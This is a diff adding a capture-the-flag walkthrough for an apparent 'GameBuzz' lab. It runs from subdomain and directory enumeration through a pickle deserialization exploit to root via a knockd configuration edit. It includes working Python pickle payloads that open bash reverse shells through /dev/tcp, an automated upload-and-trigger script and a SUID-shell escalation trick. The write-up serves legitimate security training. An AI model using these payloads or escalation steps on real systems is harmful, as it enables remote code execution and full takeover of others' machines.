@@ -22,10 +22,7 @@ Like my work, Follow on Twitter to be updated and know more about my work! (@0ci
 
 ```bash
 :~/GameBuzz# nmap -sC -sV -Pn -n -p- -T4 10.67.143.85
-Starting Nmap 7.80 ( https://nmap.org ) at 2025-12-28 18:40 GMT
-Nmap scan report for 10.67.143.85
-Host is up (0.00016s latency).
-Not shown: 65533 closed ports
+...
 PORT   STATE    SERVICE VERSION
 22/tcp filtered ssh
 80/tcp open     http    Apache httpd 2.4.29 ((Ubuntu))
@@ -1128,8 +1125,495 @@ www-data@incognito:/$ knock incognito 5020:tcp 6120:tcp 7340:tcp incognito
 
 
 
+<p>__________________________________________________________________________________________________________</p>
+
+<h1 align="center">Port Scanning</h1>
+
+```bash
+:~/GameBuzz# nmap -sC -sV -Pn -n -p- -T4 10.67.143.85
+```
+
+```bash
+:~#  rustscan -a MACHINE_IP --scripts none
+```
+
+<br>
+<br>
+<h1 align="center">Web Vulnerability Scanning</h1>
+
+```bash
+:~/GameBuzz# nikto -h http://incognito.com
+```
+
+<br>
+<br>
+<h1 align="center">Web Interface Inspection</h1>
+<h1 align="center">Static Host Mapping</h1>
+<p>
+
+- Launch a web browser.<br>
+- Navigate to <strong>MACHINE_IP</strong>.<br>
+- Scroll Down.<br>
+- Note <strting>admin@incognito.com</strong>.</p>
+
+<br>
+<br>
+<h1 align="center">Static Host Mapping</h1>
+<p>
+
+- Add it to hosts´ file.</p></p>
+
+```bash
+MACHINE_IP incognito.com
+```
+
+<br>
+<br>
+<h1 align="center">Directory and File Enumeration</h1>
+<p>
+
+- Identify <strong>dev.incognito.com/robots.txt</strong> and <strong>dev.incognito.com/secret/uploads/</strong>.</p>
+
+```bash
+
+```
+
+<br>
+<br>
+<h1 align="center">Web Interface Inspection</h1>
+<p align="center">dev.incognito.com</p>
+<p>
+
+- Navigate to <strong>incognito.com</strong>.<br>
+- Launch <strong>Burp Suite</strong>.<br>
+- Set up <strong>Foxy Proxy</strong>.<br>
+- Note that when selecting one of the games (i.e. <strong>Game 2</strong>), a <strong>POST</strong> Request is sent fetching an <strong>object</strong> paramenter containing a <strong>.pkl</strong> file.<br>
+- Note variations in <strong>Burp</strong>´s <strong>Response</strong> for each game.</p>
+
+<img width="1268" height="456" alt="image" src="https://github.com/user-attachments/assets/4b3ac352-d37e-4e29-af08-fdabe831981c" />
 
 
+```bash
+{"object":"/var/upload/games/object.pkl"}
+```
+
+```bash
+{"Game": "GTA5", "Rating": 9, "Review": "Nice"}
+```
+
+<img width="1282" height="467" alt="image" src="https://github.com/user-attachments/assets/ec873cfa-948f-4af7-ba8c-be5f19dabed6" />
+
+```bash
+{"object":"/var/upload/games/object1.pkl"}
+```
+
+```bash
+{"Game": "Red Dead Redemption 2", "Rating": 10, "Review": "Too Good"}
+```
+
+
+<img width="1276" height="463" alt="image" src="https://github.com/user-attachments/assets/26e3bf99-c9ae-403c-98b2-ae63b119a0b2" />
+
+
+<br>
+<br>
+
+```bash
+{"object":"/var/upload/games/object2.pkl"}
+```
+
+```bash
+{"Game": "Valorant", "Rating": 7, "Review": "Okay"}
+```
+
+<br>
+<br>
+<h1 align="center">Subdomain Enumeration</h1>
+<p>
+
+- Enumerate subdomains<br>
+- Identify <strong>dev.incognito.com</strong>.</p>
+
+```bash
+:~/GameBuzz# ffuf -u http://incognito.com/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.incognito.com" -fl 429 -ic -c
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://incognito.com/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.incognito.com
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response lines: 429
+________________________________________________
+
+dev                     [Status: 200, Size: 57, Words: 5, Lines: 2]
+:: Progress: [114528/114528] :: Job [1/1] :: 506 req/sec :: Duration: [0:04:28] :: Errors: 0 ::
+```
+
+<br>
+<br>
+<h1 align="center">Static Host Mapping</h1>
+<p>
+	
+- Add it to hosts´ file.</p>
+
+```bash
+MACHINE_IP incognito.com dev.incognito.com
+```
+
+<br>
+<br>
+<h1 align="center">Web Vulnerability Scanning</h1>
+
+```bash
+:~/GameBuzz# nikto -h http://dev.incognito.com
+```
+
+<br>
+<br>
+<h1 align="center">Directory and File Enumeration</h1>
+<p>
+
+- Identify dev.incognito.com/<code>robots.txt</code> and dev.incognito.com/secret<code>/uploads</code>/.</p>
+
+```bash
+:~/GameBuzz# ffuf -u http://dev.incognito.com/FUZZ -w /usr/share/wordlists/dirb/big.txt -ic -c -recursion -mc 200,301
+...
+```
+
+```bash
+:~/GameBuzz# ffuf -u http://dev.incognito.com/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -c -recursion
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://dev.incognito.com/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+                        [Status: 200, Size: 57, Words: 5, Lines: 2]
+secret                  [Status: 301, Size: 323, Words: 20, Lines: 10]
+[INFO] Adding a new job to the queue: http://dev.incognito.com/secret/FUZZ
+
+                        [Status: 200, Size: 57, Words: 5, Lines: 2]
+server-status           [Status: 403, Size: 282, Words: 20, Lines: 10]
+[INFO] Starting queued job on target: http://dev.incognito.com/secret/FUZZ
+
+                        [Status: 403, Size: 282, Words: 20, Lines: 10]
+upload                  [Status: 301, Size: 330, Words: 20, Lines: 10]
+[INFO] Adding a new job to the queue: http://dev.incognito.com/secret/upload/FUZZ
+
+                        [Status: 403, Size: 282, Words: 20, Lines: 10]
+[INFO] Starting queued job on target: http://dev.incognito.com/secret/upload/FUZZ
+
+                        [Status: 200, Size: 370, Words: 58, Lines: 15]
+                        [Status: 200, Size: 370, Words: 58, Lines: 15]
+:: Progress: [220547/220547] :: Job [3/3] :: 8873 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
+```
+
+<img width="1260" height="651" alt="image" src="https://github.com/user-attachments/assets/7324d6d3-d4f8-45e5-a880-1bbec5bf3902" />
+
+<br>
+<br>
+<br>
+<h1 align="center">Web Interface Inspection</h1>
+<p align="center">dev.incognito.com</p>
+
+```bash
+:~/GameBuzz# curl http://dev.incognito.com/
+<h1 style="text-align: center;">Only for Developers</h1>
+```
+
+```bash
+:~/GameBuzz# curl http://dev.incognito.com/robots.txt
+User-Agent: *
+Disallow: /secret
+```
+
+<img width="1211" height="220" alt="image" src="https://github.com/user-attachments/assets/dd61d2e4-39dc-4a20-8e8e-d1bf66ef32ba" />
+
+<br>
+<br>
+<br>
+
+<img width="1216" height="243" alt="image" src="https://github.com/user-attachments/assets/c30aeda4-2683-4cc0-9275-c9d79639ea5f" />
+
+<br>
+<br>
+<br>
+<h1 align="center">Initial Foothold</h1>
+<p>
+	
+- Navigate to the path just uncovered.<br>
+- Upload a <strong>test.txt</strong> file.</p>
+
+```bash
+:~# echo -n 'Testing ...' > test.txt
+```
+
+<p>
+
+- Note the message <strong>The file test.txt has been uploaded</strong>.<br>
+- Check <strong>Burp Suite</strong>.<br>
+- Remember the  <strong>.pkl</strong> object fetched in previous <strong>Request</strong><br>
+- Craft a <strong>pickle</strong> exploit to upload a <strong>.pkl</strong> object.<br>
+- Set up a listener.<br><br>
+- Execute the exploit file.</p>
+
+```bash
+:~# cat exploit.py
+import requests
+import pickle
+import os
+
+class RCE:
+    def __reduce__(self):
+        cmd = ("bash -c -'bash -i >& /dev/tcp/xx.xx.xx.xx/1234 0>&1'")
+        return os.system,(cmd,)
+picke.dump(RCE(), open("shell", "wb"))
+```
+
+
+outra alternativa
+
+```bash
+#!/usr/bin/env python3
+
+import requests
+import pickle
+import os
+
+class PickleRCE:
+    def __reduce__(self):
+        return (os.system,("bash -c '/bin/bash -i >& /dev/tcp/10.9.0.253/443 0>&1' ",))
+
+def main():
+    uploadURL = 'http://dev.incognito.com/secret/upload/script.php'
+    uploadData = {'submit': 'Start Upload'}
+
+    filename = 'evilObject.pkl'
+    file = {
+        'the_file': (f'/var/upload/{filename}', pickle.dumps(PickleRCE()))
+    }
+
+    uploadRequestResult = requests.post(uploadURL, data=uploadData, files=file)
+    print(f'[*] Upload file request:\n{uploadRequestResult.text}')
+
+    pickleURL = 'http://incognito.com/fetch'
+    pickleData = {'object': f'/var/upload/{filename}'}
+
+    pickleRequestResult = requests.post(pickleURL, json=pickleData)
+    print(f'[*] Fetch pickle request:\n{pickleRequestResult.text}')
+
+if __name__ == '__main__':
+    main()
+```
+
+______________________
+a parte
+```bash
+:~# python3 exploit.py
+```
+a parte
+```bash
+:~# ls -la | grep shell
+
+```
+
+a parte
+<p>upload  the shell file in http://dev.incognito.com/secret/upload/
+______________________
+
+
+
+<p>
+
+- Stabilize the shell.</p>
+
+```bash
+...
+www-data@incognito:/$ python -c '
+
+Crtl^Z
+stty
+
+www-data@incognito:/$ export TERM-xterm-256color
+```
+
+```bash
+...
+www-data@incognito:/$ whoami;id;hostname;pwd;ip a
+
+
+...
+```
+
+```bash
+...
+www-data@incognito:/$ cat /etc/passwd | grep 'bin/bash'
+
+
+...
+```
+
+
+```bash
+www-data@incognito:/$ cat /home/dev2/user.txt
+...
+```
+
+```bash
+www-data@incognito:/var/www/incognito.com$ ls
+__pycache__  incognito	incognito.wsgi
+```
+
+```bash
+ww-data@incognito:/var/www/incognito.com$ cat incognito.wsgi
+#!/usr/bin/python3
+import sys
+import logging
+logging.basicConfig(stream=sys.stderr)
+sys.path.insert(0,"/var/www/incognito.com/incognito/")
+
+from incognito import app as application
+application.secret_key = 'KeepITSecret'
+```
+
+```bash
+www-data@incognito:/$ cat /var/www/incognito.com/incognito.wsgi
+```
+
+```bash
+www-data@incognito:/home/dev2$ cd /var/mail/
+```
+
+```bash
+www-data@incognito:/var/mail$ ls -la
+```
+
+```bash
+www-data@incognito:/var/mail$ cat dev1
+Hey, your password has been changed, dc647eb65e6711e155375218212b3964.
+Knock yourself in!
+```
+
+
+```bash
+www-data@incognito:/tmp$ knockd -v 5020 6120 7340
+hitting tcp .....:6120
+hitting tcp .....:7340
+```
+
+
+```bash
+:~# knock -v 10.10.162.158 5020 6120 7340
+hitting tcp 10.10.162.158:5020
+hitting tcp 10.10.162.158:6120
+hitting tcp 10.10.162.158:7340
+```
+
+```bash
+:~# ssh dev1@incognito.com
+```
+
+```bash
+dev1@incognito:~$ sudo -l
+```
+
+```bash
+dev1@incognito:~$ ls -lah /etc/init.d/knockd
+```
+
+```bash
+dev1@incognito:~$ cat /etc/knock.conf
+...
+[openSSH]
+        sequence    = 5020,6120,7340
+        seq_timeout = 15
+        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+        tcpflags    = syn
+```
+
+```bash
+dev1@incognito:~$ nano /etc/knock.conf
+```
+
+```bash
+dev1@incognito:~$ cat /etc/knock.conf
+...
+[openSSH]
+        sequence    = 5020,6120,7340
+        seq_timeout = 15
+        command     = bash -c 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash'
+        tcpflags    = syn
+```
+
+
+```bash
+dev1@incognito:~$ sudo /etc/init.d/knockd restart
+...
+```
+
+```bash
+dev1@incognito:~$ knock -v 10.10.162.158 5020 6120 7340
+hitting tcp 10.10.162.158:5020
+hitting tcp 10.10.162.158:6120
+hitting tcp 10.10.162.158:7340
+```
+
+```bash
+dev1@incognito:~$ ls -lah /tmp | grep -i rootbash
+...
+```
+
+```bash
+dev1@incognito:~$ /tmp/rootbash -p
+```
+
+```bash
+rootbash-4.4# cd /root/
+```
+
+```bash
+rootbash-4.4# ls -lah
+...
+```
+
+```bash
+rootbash-4.4# cat root.txt | wc -m
+33
+```
+
+```bash
+rootbash-4.4# cat root.txt
+...
+```
 
 
 
